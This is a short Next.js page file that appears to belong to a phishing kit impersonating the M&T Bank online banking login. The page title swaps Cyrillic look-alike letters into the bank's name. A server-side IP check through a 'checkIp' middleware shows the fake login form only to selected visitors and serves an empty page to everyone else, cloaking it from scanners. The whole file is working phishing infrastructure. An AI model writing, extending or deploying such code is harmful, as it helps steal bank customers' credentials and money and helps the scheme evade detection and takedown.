import MobileDetect from "mobile-detect";
import type { GetServerSideProps, NextPage } from "next";
import Head from "next/head";
import { Login } from "../components/Login";
import checkIp from "../middleware/checkIp";

const index: NextPage<{ isBot: boolean }> = ({ isBot }) => {
  if (!isBot) {
    return <div />;
  }

  return (
    <>
      <Head>
        <link rel="shortcut icon" href="/favicon.ico" />
        <title>
          Log in to М&Т Online Ваnking or Commercial Treasury Center
        </title>
      </Head>
      <Login />
    </>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
  }
};

export default index;
